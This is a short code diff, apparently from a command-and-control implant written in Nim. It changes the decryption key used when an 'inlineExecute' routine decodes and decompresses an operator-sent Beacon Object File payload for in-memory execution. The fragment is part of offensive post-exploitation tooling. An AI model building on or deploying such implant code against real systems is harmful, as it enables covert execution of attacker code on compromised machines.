@@ -253,7 +253,7 @@ proc inlineExecute*(li : Listener, args : varargs[string]) : string =
     let
         bofB64: string = args[0]
 
-    var dec = decryptData(bofB64, li.cryptKey)
+    var dec = decryptData(bofB64, li.UNIQUE_XOR_KEY)
     var decStr: string = cast[string](dec)
     var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))
 
